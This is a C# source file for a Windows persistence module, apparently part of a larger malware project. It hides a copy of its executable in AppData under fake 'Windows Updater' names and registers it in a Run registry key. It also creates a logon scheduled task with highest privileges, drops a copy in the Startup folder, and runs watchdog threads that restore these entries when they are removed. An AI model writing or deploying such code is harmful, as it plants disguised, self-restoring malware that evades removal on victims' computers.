using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;

namespace XYZ.modules
{
    public class ResilientPersistence
    {
        private static string _executablePath;
        private static string _appDataPath;
        private static string _startupPath;

        static ResilientPersistence()
        {
            _executablePath = Assembly.GetExecutingAssembly().Location;
            _appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WindowsUpdater");
            _startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        }

        public static void MaintainPersistence()
        {
            try
            {
                SecureLogger.LogInfo("Persistence", "Checking persistence mechanisms...");

                EnsureDirectoryExists();
                EnsureRegistryPersistence();
                EnsureScheduledTask();
                EnsureStartupFolder();
                
                // Watcher thread to restore persistence if removed
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            EnsureRegistryPersistence();
                            EnsureStartupFolder();
                            Thread.Sleep(60000); // Check every minute
                        }
                        catch { }
                    }
                }) { IsBackground = true }.Start();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Persistence", ex);
            }
        }

        private static void EnsureDirectoryExists()
        {
            if (!Directory.Exists(_appDataPath))
            {
                Directory.CreateDirectory(_appDataPath);
                File.SetAttributes(_appDataPath, FileAttributes.Hidden | FileAttributes.System);
            }

            string destFile = Path.Combine(_appDataPath, "updater.exe");
            if (!File.Exists(destFile) || new FileInfo(destFile).Length != new FileInfo(_executablePath).Length)
            {
                try
                {
                    File.Copy(_executablePath, destFile, true);
                    SecureLogger.LogInfo("Persistence", "Copied to AppData");
                }
                catch { }
            }
        }

        private static void EnsureRegistryPersistence()
        {
            try
            {
                string keyName = "WindowsUpdateService"; // Disguised name
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        object value = key.GetValue(keyName);
                        if (value == null || value.ToString() != _executablePath)
                        {
                            key.SetValue(keyName, _executablePath);
                            SecureLogger.LogInfo("Persistence", "Registry run key set");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                 SecureLogger.LogError("Persistence", new Exception(string.Format("Registry failed: {0}", ex.Message)));
            }
        }

        private static void EnsureScheduledTask()
        {
            try
            {
                string taskName = "WindowsSecurityUpdate";
                // Usando schtasks.exe pois é mais simples em C# 5 sem wrappers COM grandes
                ProcessStartInfo checkInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = string.Format("/query /tn \"{0}\"", taskName),
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process process = Process.Start(checkInfo);
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    // Create task
                    string args = string.Format("/create /tn \"{0}\" /tr \"{1}\" /sc onlogon /f /rl highest", taskName, _executablePath);
                    ProcessStartInfo createInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = args,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    Process.Start(createInfo).WaitForExit();
                    SecureLogger.LogInfo("Persistence", "Scheduled task created");
                }
            }
            catch (Exception ex)
            {
                 SecureLogger.LogError("Persistence", new Exception(string.Format("Task failed: {0}", ex.Message)));
            }
        }

        private static void EnsureStartupFolder()
        {
            try
            {
                // Simple copy exe to startup in this case to avoid COM interop complexity
                string destExe = Path.Combine(_startupPath, "updater.exe");
                
                if (!File.Exists(destExe))
                {
                    File.Copy(_executablePath, destExe, true);
                    SecureLogger.LogInfo("Persistence", "Copied to Startup folder");
                }
            }
            catch { }
        }

        public static void EnsureMultiLayeredPersistence()
        {
            MaintainPersistence();
        }

        private static Thread watchdogThread;

        public static void StartPersistenceWatchdog()
        {
            if (watchdogThread != null && watchdogThread.IsAlive)
                return;

            watchdogThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        EnsureMultiLayeredPersistence();
                        Thread.Sleep(300000); // Check every 5 minutes
                    }
                    catch { }
                }
            })
            { IsBackground = true };
            watchdogThread.Start();
            SecureLogger.LogInfo("Persistence", "Persistence watchdog started");
        }
    }
}
